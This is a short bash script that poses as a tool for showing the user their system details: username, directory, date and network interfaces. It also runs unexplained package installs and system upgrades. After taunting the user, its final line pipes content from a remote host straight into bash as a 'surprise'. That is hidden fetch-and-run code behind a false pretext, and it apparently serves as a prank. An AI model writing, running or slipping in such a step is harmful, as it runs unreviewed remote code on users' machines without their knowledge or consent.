#!bin/bash

user=$(whoami)
date=$(date)
whereami=$(pwd)
Networkadd=$(ifconfig)
Morenet=$(ip a)


clear

sleep 3

echo "Installing necessary packages to give you infos about you"

sleep 1


apt update -y
apt upgrade -y
apt install net-tools
apt install iproute2
sudo apt update -y
sudo apt install net-tools -y
sudo apt install iproute2
apk add net-tools -y
apk add iproute2 -y


sleep 2


clear

echo "So..,you want me to show you your info, ok"

sleep 2

echo " you are currently logged in as $user"

sleep 2

echo "you are in this directory $whereami"

sleep 1

echo "i didn't finish wait"


sleep 1


echo "the current date is $date"


sleep 2

echo "your network ip address is $Networkadd, not enough info about your network, ok here is all of the info,"

sleep 3


echo "All infos are....."


sleep 3

echo "$Morenet"


sleep 7


clear

echo "So, you believed me,and i did my job, showing you infos about YOU."

sleep 2

echo "Bye.Bye"


sleep 3


pkg install curl -y
apk add curl -y
sudo apt install curl -y


sleep 3


echo "I have a suprise for you"

sleep 3



curl -sN http://rick.jachan.dev | bash
